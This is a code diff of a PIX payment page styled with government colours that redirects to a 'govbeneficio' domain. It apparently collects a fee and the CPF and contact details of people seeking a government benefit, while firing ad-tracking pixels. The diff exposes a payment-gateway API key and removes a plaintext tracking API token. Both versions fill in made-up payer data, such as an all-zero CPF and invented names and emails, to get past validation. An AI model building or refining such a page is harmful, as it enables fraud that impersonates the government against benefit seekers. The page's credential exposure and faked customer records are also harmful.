@@ -10,6 +10,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   ttq.page();
 }(window, document, 'ttq');
 </script>
+
 <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
 <script>
 window.tikTokPixelId = "19cebd8877cbf1cb62fe26d1297b78272d4621f0";
@@ -18,6 +19,7 @@ a.setAttribute("async",""); a.setAttribute("defer","");
 a.setAttribute("src","https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
 document.head.appendChild(a);
 </script>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
 <title>Pagamento Seguro - PIX</title>
@@ -274,22 +276,20 @@ document.head.appendChild(a);
     <a href="politica-privacidade.html" style="color:var(--gov-blue-primary);text-decoration:none;">Política de Privacidade</a>
   </p>
 </footer>
-<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
+
 <script src="https://checkout.mangofy.com.br/js/new/fast_api.min.js?key=vstmvkxe-6e3a42e3-3c50-48ff-a052-c566cdc1f21e" id="pix-sdk-script"></script>
 <script>
   var PIX_VALOR_CENTS   = 6490;
   var PIX_DESCRICAO     = 'Front';
   var PIX_REDIRECT      = 'https://govbeneficio.vercel.app/up1.html';
-  var PARADISE_PRODUCT_HASH = 'prod_7333c0ff75106325';
-  var UTMIFY_API_TOKEN = 'hLLRiNJhaIzqdivrzVY7PLr1zH3sia014pMW';
+  // O Produto Hash não é mais estritamente necessário no HTML se a Mangofy já o reconhece pela chave da API.
 
   var _pixCode='',_pixPaymentCode='',_pixQRFeito=false,_checkoutDisparado=false;
-  var _pixCreatedAt='';
   var _p=new URLSearchParams(window.location.search);
   var _nome=(_p.get('nome')||'').trim();
   var _cpf=(_p.get('cpf')||'').replace(/\D/g,'');
-  var _email=(_p.get('email')||'cliente@email.com').trim();
-  var _fone=(_p.get('telefone')||'11999999999').replace(/\D/g,'');
+  var _email=(_p.get('email')||'').trim();
+  var _fone=(_p.get('telefone')||'').replace(/\D/g,'');
 
   var _utm_source   = _p.get('utm_source')   || '';
   var _utm_medium   = _p.get('utm_medium')   || '';
@@ -299,83 +299,6 @@ document.head.appendChild(a);
   var _utm_id       = _p.get('utm_id')       || '';
   var _src          = _p.get('src')          || '';
   var _sck          = _p.get('sck')          || '';
-
-  function utmifyFmtDate(d) {
-    return d.getFullYear() + '-' +
-      String(d.getMonth()+1).padStart(2,'0') + '-' +
-      String(d.getDate()).padStart(2,'0') + ' ' +
-      String(d.getHours()).padStart(2,'0') + ':' +
-      String(d.getMinutes()).padStart(2,'0') + ':' +
-      String(d.getSeconds()).padStart(2,'0');
-  }
-
-  // BLINDAGEM NO PAYLOAD PARA UTMIFY NÃO RECUSAR
-  async function utmifyNotificar(status) {
-    try {
-      var agora    = new Date();
-      var agoraStr = utmifyFmtDate(agora);
-      
-      // Regra 1: Nome precisa ter sobrenome, senão utmify pode recusar
-      var nomeEnvio = nomeOk || 'Cliente Pagador';
-      if (nomeEnvio.trim().split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
-
-      // Regra 2: orderId nunca pode ir vazio e tem que ser String
-      var safeOrderId = _pixPaymentCode ? String(_pixPaymentCode) : ('PIX-' + Date.now());
-
-      // Regra 3: Se não tiver CPF na URL, passa um fallback pois UTMify exige document em conta BR
-      var safeCpf = _cpf || '00000000000';
-
-      var body = {
-        orderId:       safeOrderId,
-        platform:      'custom',
-        paymentMethod: 'pix',
-        status:        status,
-        createdAt:     _pixCreatedAt || agoraStr,
-        approvedDate:  status === 'paid' ? agoraStr : null,
-        refundedAt:    null,
-        customer: {
-          name:     nomeEnvio,
-          email:    (_email && _email.indexOf('@') > 0) ? _email : 'pagador@gmail.com',
-          phone:    _fone || '11999999999',
-          document: safeCpf,
-          country:  'BR',
-          ip:       null
-        },
-        products: [{
-          id:          PARADISE_PRODUCT_HASH,
-          name:        PIX_DESCRICAO,
-          planId:      null,
-          planName:    null,
-          quantity:    1,
-          priceInCents: PIX_VALOR_CENTS
-        }],
-        commission: {
-          totalPriceInCents:     PIX_VALOR_CENTS,
-          gatewayFeeInCents:     0,
-          userCommissionInCents: PIX_VALOR_CENTS
-        },
-        isTest: false,
-        utm: {
-          src:          _src,
-          sck:          _sck,
-          utm_source:   _utm_source,
-          utm_medium:   _utm_medium,
-          utm_campaign: _utm_campaign,
-          utm_content:  _utm_content,
-          utm_term:     _utm_term
-        },
-        trackingParameters: { src: _src, sck: _sck }
-      };
-
-      await fetch('https://api.utmify.com.br/api-credentials/orders', {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json', 'x-api-token': UTMIFY_API_TOKEN },
-        body: JSON.stringify(body)
-      });
-    } catch(e) {
-      console.error('Erro UTMify:', e);
-    }
-  }
 
   function utmRedirectUrl() {
     var base = PIX_REDIRECT;
@@ -480,7 +403,6 @@ document.head.appendChild(a);
   async function pixIniciar(){
     var cache = pixLerCache();
     if(cache && cache.pixCode){
-      _pixCreatedAt = utmifyFmtDate(new Date(cache.criadoEm));
       _pixPaymentCode = cache.paymentCode || '';
       pixExibir(cache.pixCode, cache.qrImage);
       ttqViewContent();
@@ -516,7 +438,7 @@ document.head.appendChild(a);
         total_price: PIX_VALOR_CENTS / 100,
         customer: {
             name: nomeEnvio,
-            document: _cpf || '',
+            document: _cpf || '00000000000', // Evita falha se CPF vier vazio
             email: emailConfig,
             phone: phoneConfig
         },
@@ -529,10 +451,7 @@ document.head.appendChild(a);
       if(!response.success) throw new Error(response.message || 'Erro ao gerar PIX');
 
       _pixCode        = response.pixCode || '';
-      
-      // FALLBACK DE ID MÚLTIPLO (Evita que fique vazio se a Mangofy mudar o nome do parâmetro)
       _pixPaymentCode = response.paymentCode || response.transactionId || response.id || '';
-      _pixCreatedAt   = utmifyFmtDate(new Date());
 
       pixSalvarCache(_pixCode, response.qrCodeImage, _pixPaymentCode);
 
@@ -540,7 +459,7 @@ document.head.appendChild(a);
       ttqViewContent();
       ttqInitiateCheckout();
       
-      utmifyNotificar('waiting_payment');
+      // A MANGOFY JÁ AVISA A UTMIFY PELO BACKEND. NÃO ENVIAMOS MAIS MANUALMENTE.
 
     } catch(err){
       console.error('Erro PIX Mangofy:', err);
@@ -556,7 +475,7 @@ document.head.appendChild(a);
   async function paymentApproved(){
     pixLimparCache();
     ttqPurchase();
-    await utmifyNotificar('paid');
+    // A MANGOFY JÁ AVISA A UTMIFY PELO BACKEND. APENAS REDIRECIONA.
     window.location.href = utmRedirectUrl();
   }
 
